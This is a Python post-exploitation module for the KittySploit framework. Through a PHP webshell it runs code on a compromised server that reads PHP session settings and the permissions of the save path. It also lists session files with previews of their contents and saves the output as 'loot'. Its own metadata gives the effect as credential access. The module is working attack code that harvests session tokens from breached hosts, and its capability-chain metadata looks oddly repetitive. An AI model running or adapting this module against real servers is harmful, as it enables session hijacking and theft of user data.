#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import time

from kittysploit import *
from lib.post.php.helpers import PhpPostHelper


class Module(Post, PhpPostHelper):
    __info__ = {
        "name": "PHP Session Hijack / Fixation Audit",
        "description": (
            "Audits PHP session configuration, session.save_path permissions, active session "
            "files, and fixation-related ini settings from a PHP webshell session."
        ),
        "author": "KittySploit Team",
        "arch": Arch.PHP,
        "session_type": SessionType.PHP,
        "tags": ["php", "session", "audit", "fixation", "hijack"],
        "references": ["https://owasp.org/www-community/attacks/Session_fixation"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['credential_access'],
        'expected_requests': 2,
        'reversible': True,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    max_sessions = OptInteger(30, "Maximum session files to list", False)
    export_loot = OptBool(True, "Save full audit to output/loot/", False)

    _SESSION_KEYS = (
        "session.save_handler",
        "session.save_path",
        "session.name",
        "session.use_strict_mode",
        "session.use_cookies",
        "session.use_only_cookies",
        "session.cookie_httponly",
        "session.cookie_secure",
        "session.cookie_samesite",
        "session.cookie_lifetime",
        "session.gc_maxlifetime",
        "session.sid_length",
        "session.sid_bits_per_character",
        "session.serialize_handler",
    )

    def run(self):
        limit = int(self.max_sessions.value if hasattr(self.max_sessions, "value") else self.max_sessions)
        keys = ",".join(f"'{k}'" for k in self._SESSION_KEYS)
        php = f"""
$keys = array({keys});
echo "=== PHP Session Configuration ===\\n";
foreach ($keys as $k) {{
    $v = ini_get($k);
    echo $k . '=' . ($v === false || $v === '' ? '(empty)' : $v) . "\\n";
}}
echo "\\n=== Runtime ===\\n";
echo 'session_id=' . session_id() . "\\n";
echo 'session_status=' . session_status() . "\\n";
echo 'php_sapi=' . php_sapi_name() . "\\n";

$save = ini_get('session.save_path');
if ($save === '' || $save === false) {{
    $save = sys_get_temp_dir();
}}
$save = rtrim($save, '/');
echo 'resolved_save_path=' . $save . "\\n";
echo 'save_path_exists=' . (is_dir($save) ? 'yes' : 'no') . "\\n";
echo 'save_path_readable=' . (is_readable($save) ? 'yes' : 'no') . "\\n";
echo 'save_path_writable=' . (is_writable($save) ? 'yes' : 'no') . "\\n";

$strict = ini_get('session.use_strict_mode');
$only = ini_get('session.use_only_cookies');
echo '\\n=== Fixation risk hints ===\\n';
if ($strict != '1') {{
    echo 'RISK: session.use_strict_mode is off (fixation easier)\\n';
}}
if ($only != '1') {{
    echo 'RISK: session.use_only_cookies is off\\n';
}}
if (is_writable($save)) {{
    echo 'RISK: session.save_path is writable (session file hijack / planting)\\n';
}}

echo '\\n=== Session files (sess_*) ===\\n';
$count = 0;
$limit = {limit};
if (is_dir($save) && is_readable($save)) {{
    $files = @scandir($save);
    if ($files) {{
        foreach ($files as $f) {{
            if ($f === '.' || $f === '..') continue;
            if (strpos($f, 'sess_') !== 0 && strpos($f, 'phpsess_') !== 0) continue;
            $full = $save . '/' . $f;
            if (!is_file($full)) continue;
            $count++;
            if ($count > $limit) {{
                echo '... truncated after {limit} files' . "\\n";
                break;
            }}
            $size = filesize($full);
            $mtime = date('Y-m-d H:i:s', filemtime($full));
            $preview = '';
            if (is_readable($full) && $size > 0 && $size < 8192) {{
                $raw = file_get_contents($full);
                $preview = substr(preg_replace('/[^\\x20-\\x7E]/', '.', $raw), 0, 120);
            }}
            echo $f . ' size=' . $size . ' mtime=' . $mtime;
            if ($preview !== '') echo ' preview=' . $preview;
            echo "\\n";
        }}
    }}
    echo 'session_file_count=' . $count . "\\n";
}} else {{
    echo 'Cannot read session directory\\n';
}}

$alt_paths = array('/var/lib/php/sessions', '/tmp', '/var/tmp');
echo '\\n=== Alternate session paths ===\\n';
foreach ($alt_paths as $p) {{
    if (!is_dir($p)) continue;
    echo $p . ' readable=' . (is_readable($p) ? 'yes' : 'no')
        . ' writable=' . (is_writable($p) ? 'yes' : 'no') . "\\n";
}}
"""
        output = self.cmd_execute(php)
        if not output:
            print_error("No output from session audit")
            return False

        print_info(output)

        if self.export_loot:
            ts = int(time.time())
            rel = os.path.join("loot", f"php_session_audit_{ts}.txt")
            if self.write_out_dir(rel, output, quiet=True):
                print_good(f"Audit saved to output/{rel}")

        risky = any(
            token in output
            for token in (
                "RISK:",
                "save_path_writable=yes",
            )
        )
        if risky:
            print_warning("Session hijack / fixation risks identified — review RISK lines above")
        else:
            print_success("Session audit completed")
        return True
